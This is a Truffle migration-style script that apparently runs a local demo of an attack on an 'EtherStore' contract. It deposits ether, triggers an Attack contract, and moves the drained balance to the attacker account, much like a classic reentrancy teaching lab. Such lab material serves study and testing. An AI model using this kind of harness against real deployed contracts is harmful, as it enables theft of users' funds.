const Sample = artifacts.require("Sample");
const Attack = artifacts.require("Attack");
const EtherStore = artifacts.require("EtherStore");

module.exports = async function(callback) {

    var accounts = await web3.eth.getAccounts()
    var attackInst = await Attack.deployed();
    var bankStore = await EtherStore.deployed();

    const depositElseAttack = 1
    
    if (depositElseAttack === 1) {
        bankStore.deposit({from: accounts[3], value: 1000000000000000000}).then(() => {
            console.log("Deposit Done : Account: " + accounts[3]);
        }).catch(function(err) {
            console.log(err);
        })

        bankStore.getBalance().then((balance) => {
            console.log(balance)    
        });

        bankStore.deposit({from: accounts[0], value: 1000000000000000000}).then(async () => {
            console.log("Deposit Done : Account: " + accounts[0]);
            await new Promise(r => setTimeout(r, 5000));
            bankStore.getBalance({from: accounts[0]}).then(async (value) => {
                console.log(value);
                await new Promise(r => setTimeout(r, 5000));
                attackInst.getBalance().then(async (value) => {
                    console.log(value);
                })

                await new Promise(r => setTimeout(r, 1000));
                attackInst.attack({from: accounts[0], value: 1000000000000000000}).then(async () => {
                    console.log("Attack Done"); 
                    
                    await new Promise(r => setTimeout(r, 1000));
                    attackInst.transferToaddress(accounts[0]).then(() => {
                        console.log("Money Transfered");
                    }).catch((err) => {
                        console.log(err);
                    })

                }).catch(function(err) {
                    console.log(err);
                })

                await new Promise(r => setTimeout(r, 1000));
                attackInst.getBalance().then(async (value) => {
                    console.log(value);
                })
            })
        }).catch(function(err) {
            console.log(err);
        })

    } else {
        console.log("Remits"); 
        
        attackInst.getBalance().then(async (value) => {
            console.log(value);
        })

        bankStore.withdraw({from: accounts[0]}).then(() => {
            console.log("Withdrawn");
        }).catch(function(err) {
            console.log(err);
        })

        bankStore.withdraw({from: accounts[3]}).then(() => {
            console.log("Withdrawn");
        }).catch(function(err) {
            console.log(err);
        })
    }
}